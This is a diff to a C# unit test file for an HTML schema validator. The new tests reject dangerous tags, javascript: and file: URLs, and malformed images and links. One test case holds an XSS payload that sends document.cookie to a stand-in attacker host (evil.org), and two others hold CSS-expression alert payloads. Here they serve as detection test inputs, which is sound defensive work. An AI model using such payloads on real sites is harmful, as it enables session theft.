@@ -13,6 +13,9 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 	{
 		private void testSchema(object srcHtml, bool isValid = true, PortableHtmlSchemaErorr error = PortableHtmlSchemaErorr.None, Type exceptionType=null, bool exactState = true){
 			var result =(srcHtml is string || null==srcHtml)? PortableHtmlSchema.Validate((string)srcHtml):PortableHtmlSchema.Validate((XElement)srcHtml);
+			if (isValid && !result.Ok){
+				Console.WriteLine(result.SchemaError);
+			}
 			Assert.AreEqual(isValid,result.Ok,"Общий статус валидации неверен");
 			if (error == PortableHtmlSchemaErorr.None || exactState){
 				Assert.AreEqual(error, result.SchemaError, "Статус ошибки валидации неверен");
@@ -23,6 +26,18 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 			if (null == exceptionType) return;
 			Assert.NotNull(result.Exception,"Ожидалось исключение");
 			Assert.AreEqual(exceptionType,result.Exception.GetType(),"Исключение имеет неверный тип");
+			if (PortableHtmlVerificationStrategy.ForcedResult == result.Strategy){
+				if (!result.Ok){
+					Assert.AreEqual(1,result.Errors.Count,"Много ошибок для ForceResult");
+				}
+			}
+			if (PortableHtmlVerificationStrategy.ForcedElementResult == result.Strategy)
+			{
+				if (!result.Ok){
+					var groupped = result.Errors.GroupBy(_ => _.Element);
+					Assert.True(groupped.All(_=>_.Count()==1),"Множественные ошибки для элемента при ForceElementResult");
+				}
+			}
 		}
 
 		
@@ -134,6 +149,7 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 		[TestCase("input",		Description = "Запрещенный тег")]
 		[TestCase("button",		Description = "Запрещенный тег")]
 		[TestCase("select",		Description = "Запрещенный тег")]
+		[TestCase("applet",		Description = "Запрещенный тег")]
 		[TestCase("textarea",	Description = "Запрещенный тег")]
 		[Test(Description = "Выполнение требования 'deprecated_tags'")]
 		public void DangerousTagsTestNotAllowed(string tagName){
@@ -142,6 +158,16 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 			testSchema(html, false, error);
 			html = "<div><" + tagName.ToUpper() + "/></div>";
 			testSchema(html, false, error);
+		}
+
+		[TestCase("http://trusted.org/account.asp?ak=<script>document.location .replace('http://evil.org/steal.cgi?'+document.cookie);</script>",PortableHtmlSchemaErorr.NonXml)]
+		[TestCase("&amp;{alert('CSS Vulnerable')};", PortableHtmlSchemaErorr.NonXml)]
+		[TestCase("&{alert('CSS Vulnerable')};", PortableHtmlSchemaErorr.NonXml)]
+		[Test(Description = "Включение скрипта в IMG, проверяем, что детектим опасность из http://www.technicalinfo.net/papers/CSS.html")]
+		public void LocksHackedImages(string src, PortableHtmlSchemaErorr error){
+			var html =
+				@"<div><img src="""+src+@"""></div>";
+			testSchema(html,false,PortableHtmlSchemaErorr.NonXml);
 		}
 
 		[TestCase("<div>></div>",false)]
@@ -205,30 +231,53 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 
 		[TestCase("<div><p></p></div>", false,Description = "Обнаружение атрибутов 'angular'")]
 		[TestCase("<div><p>x<strong></strong></p></div>", false,Description = "Обнаружение атрибутов 'angular'")]
-		[TestCase("<div><p>x<img/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
-		[TestCase("<div><p><img/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
+		[TestCase("<div><p>x<img src='x'/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
+		[TestCase("<div><p><img src='x'/></p></div>", true,Description = "Нормальный элемент с пустым IMG и не пустым P")]
 		[Test(Description = "Выполнение требования 'no_empty_elements'")]
 		public void NoEmptyElementsAllowedExceptImg(string srcHtml,bool result)
 		{
 			testSchema(srcHtml, result, result?PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.EmptyElement);
 		}
 
-		[TestCase("<div></div>", true, Description = "Пустой рутовый элемент разрешен")]
-		[TestCase("<div>\t</div>", false, Description = "Пробельный рутовый элемент не считается пустым")]
-		[TestCase("<div/>", true, Description = "Пустой рутовый элемент разрешен")]
-		[Test(Description = "Выполнение требования 'no_empty_elements' - специальный кейс для рута")]
-		public void SpacedRootNotAllowed(string srcHtml, bool result)
-		{
-			testSchema(srcHtml, result, result ? PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.SpacedRootInsteadOfNull);
-		}
 		
-		[TestCase("<div><p>x<img/></p></div>", true, Description = "Закрытый пустой тег IMG")]
-		[TestCase("<div><p>x<img> </img></p></div>", false, Description = "Пустой тег IMG но с text() недопустим")]
+		[TestCase("<div><p>x<img src='x'/></p></div>", true, Description = "Закрытый пустой тег IMG")]
 		[TestCase("<div><p>x<img>some</img></p></div>", false, Description = "Недопустимы заполненные IMG")]
 		[Test(Description = "Выполнение требования 'no_empty_elements'")]
 		public void NonEmptyImagesAreNotAllowed(string srcHtml, bool result)
 		{
 			testSchema(srcHtml, result, result ? PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.NonEmptyImg);
+		}
+
+		[TestCase("data",true,true,Description = "Для IMG разрешены data:")]
+		[TestCase("data", false, false, Description = "Для A не разрешены data:")]
+		[TestCase("javascript", false, true, Description = "Для IMG не разрешены javascript:")]
+		[TestCase("javascript", false, false, Description = "Для A не разрешены javascript:")]
+		[TestCase("file", false, true, Description = "Для IMG не разрешены file:")]
+		[TestCase("file", false, false, Description = "Для A не разрешены file:")]
+		[Test(Description = "Проверка особых схем для URL")]
+		public void PreventsInvalidSchemasOnUrls(string schema,  bool result ,bool isImg){
+			var error = result?PortableHtmlSchemaErorr.None: (schema + "Link").To<PortableHtmlSchemaErorr>();
+			var tag = isImg ? "img" : "a";
+			var attr = isImg ? "src" : "href";
+			var body = isImg ? "" : "x";
+			var afterColon = schema == "file" ? "///" : "";
+			var html = string.Format("<div><{0} {1}='{2}:{3}x'>{4}</{0}></div>", tag, attr,schema, afterColon, body);
+			testSchema(html,result,error);
+		}
+		[Test(Description="У всех IMG должен быть src")]
+		public void NotAllowImagesWithOutSrcAttribute(){
+			testSchema("<div><img/></div>",false,PortableHtmlSchemaErorr.NoRequiredSrcAttributeInImg);
+		}
+		[Test(Description = "У всех IMG должен быть src")]
+		public void NotAllowAnchorsWithOutHrefAttribute()
+		{
+			testSchema("<div><a>ref</a></div>", false, PortableHtmlSchemaErorr.NoRequiredHrefAttributeInA);
+		}
+
+		[Test(Description = "Target является запрещенным атрибутом для A")]
+		public void NotAllowTargetAttributeOnAnchor()
+		{
+			testSchema("<div><a href='x' target='_b'>ссылка</a></div>", false, PortableHtmlSchemaErorr.DeprecatedAttributeDetected);
 		}
 	}
 }
